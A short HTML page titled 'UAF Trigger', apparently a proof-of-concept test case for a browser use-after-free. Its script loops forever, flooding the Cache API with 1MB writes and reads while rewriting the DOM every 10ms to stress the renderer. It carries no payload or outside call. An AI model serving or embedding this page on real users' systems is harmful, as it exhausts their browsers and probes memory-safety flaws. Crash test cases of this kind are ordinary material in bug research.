<!DOCTYPE html>
<html>
<head><title>UAF Trigger</title></head>
<body>
<script>
    // Spam the Cache API to keep the C++ async threads busy
    async function stressCache() {
        while(true) {
            let cache = await caches.open('v1-heavy-cache');
            await cache.put('/dummy.txt', new Response('A'.repeat(1024 * 1024))); // 1MB chunk
            await cache.match('/dummy.txt');
        }
    }
    
    // Spam massive DOM updates to stress the rendering tree
    function stressRenderer() {
        setInterval(() => {
            document.body.innerHTML = '<div>' + Math.random() + '</div>'.repeat(5000);
        }, 10);
    }

    stressCache();
    stressRenderer();
</script>
</body>
</html>
